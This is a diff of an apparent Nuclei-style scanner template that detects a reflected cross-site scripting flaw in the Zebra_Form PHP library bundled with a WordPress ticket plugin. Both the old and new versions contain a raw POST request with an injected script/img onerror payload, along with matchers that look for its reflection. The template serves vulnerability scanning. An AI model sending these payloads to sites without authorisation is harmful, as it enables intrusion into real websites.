@@ -1,33 +1,28 @@
 id: wordpress-zebra-form-xss
 
 info:
-  name: Zebra_Form PHP Library <= 2.9.8 - Cross-Site Scripting
+  name: Wordpress Zebra Form XSS
   author: madrobot
   severity: medium
-  description: |
-    Zebra_Form PHP library 2.9.8 and prior (which is used by some WordPress plugins) is affected by reflected cross-site scripting vulnerabilities via process.php.
-  reference:
-    - https://blog.wpscan.com/2021/02/15/zebra-form-xss-wordpress-vulnerability-affects-multiple-plugins.html
-    - https://wpscan.com/vulnerability/e4b796fa-3215-43ff-a6aa-71f6e1db25e5
-  classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
-    cvss-score: 5.4
-    cwe-id: CWE-80
-  metadata:
-    max-request: 1
-  tags: wordpress,xss,wp,wpscan,intrusive
-
-http:
+  reference: https://blog.wpscan.com/2021/02/15/zebra-form-xss-wordpress-vulnerability-affects-multiple-plugins.html
+  tags: wordpress,xss
+requests:
   - raw:
       - |
-        POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(document.domain)%3E&control=upload HTTP/1.1
+        POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(/XSS-form/)%3E&control=upload HTTP/1.1
         Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-GB,en;q=0.5
+        Accept-Encoding: gzip, deflate
         Content-Type: multipart/form-data; boundary=---------------------------77916619616724262872902741074
+        Content-Length: 241
         Origin: null
+        Connection: close
+        Upgrade-Insecure-Requests: 1
 
         -----------------------------77916619616724262872902741074
-        Content-Disposition: form-data; name="upload"; filename="{{randstr}}.txt"
+        Content-Disposition: form-data; name="upload"; filename="a.txt"
         Content-Type: text/plain
         Test
         -----------------------------77916619616724262872902741074--
@@ -35,17 +30,15 @@ http:
     matchers-condition: and
     matchers:
       - type: word
+        words:
+          - "</script><img src onerror=alert(/XSS-form/)>"
         part: body
-        words:
-          - "</script><img src onerror=alert(document.domain)>"
-
-      - type: word
-        part: header
-        words:
-          - "text/html"
 
       - type: status
         status:
           - 200
 
-# digest: 4a0a00473045022100c03ef41c0ba961c72164701241b78da8d638eb78bb78c0169c5e649bdc9945b80220262a4dc87375607046a19c874994d591e04ead2b1f9e34a1ba678283b1f70eb1:922c64590222798bb761d5b6d8e72950
+      - type: word
+        words:
+          - "text/html"
+        part: header
